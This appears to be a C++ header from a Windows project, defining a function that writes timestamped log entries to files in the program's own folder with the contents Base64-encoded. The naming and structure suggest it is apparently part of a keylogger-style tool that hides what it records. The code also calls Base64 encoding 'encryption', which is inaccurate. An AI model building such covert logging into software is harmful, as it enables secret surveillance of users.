//
// Created by younes.benhoumich on 11/02/2018.
//

#pragma once

#include <string>
#include <cstdlib>
#include <fstream>
#include <windows.h>

#include "DEFINITIONS.hpp"
#include "Helper.hpp"
#include "Base64.hpp"

namespace IO {

    std::string GetOurPath(const bool append_separator = false);
    bool MkOneDir(std::string path);
    bool MkDir(std::string path);

    template <class T> std::string WriteLog(const T &t){
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + LOG_FILE_EXTENSION;
        try {
            std::ofstream file(path + name);
            if(!file){
                return "";
            }
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
            std::string data =  Base64::EncryptB64(s.str());
            file << data;
            if(!file){
                return "";
            }
            file.close();
            return name;
        }
        catch(...) {
            return "";
        }
    }

}

